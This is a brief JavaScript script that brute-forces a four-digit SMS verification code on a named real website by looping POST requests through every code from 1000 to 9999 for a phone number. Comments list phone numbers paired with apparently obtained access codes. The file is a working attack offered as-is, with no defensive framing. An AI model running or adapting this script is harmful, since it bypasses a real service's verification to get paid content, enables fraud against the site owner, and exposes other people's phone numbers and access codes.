(function(phone){
    let isStop = false
    let fun1 = (code,Mobile,max)=>{
        if(code<max&&!isStop){
            $.post("http://www.shangxueba.cn/ajax/getpaperfree.aspx?action=CheckCode",{
                code,
                Mobile
            },function(e){
                if(e=='5'){
                    fun1(code+1,Mobile,max);
                }else{
                    alert(code)
                    console.log(code);
                    isStop = true;
                }
            })
        }
    }
    let code = 1000;
    fun1(code,phone,3999);
    fun1(code+3000,phone,6999);
    fun1(code+6000,phone,9999);

})("18611211118")
// 18611211118  20170307MG9QVYSZ2PPJ
// 18611211117  20170307FUSQRLWUQG4U
// 18611211116  201703066TBG61DD016D
// 18611211115  2017030558TY4A60L1OD
// 18611211114  20170305SDSIQFZMQILX
// 18611211113  20170305OKG7SHJ3EAUD
// 18611211111  201703053EVUJG9X1TXG
//
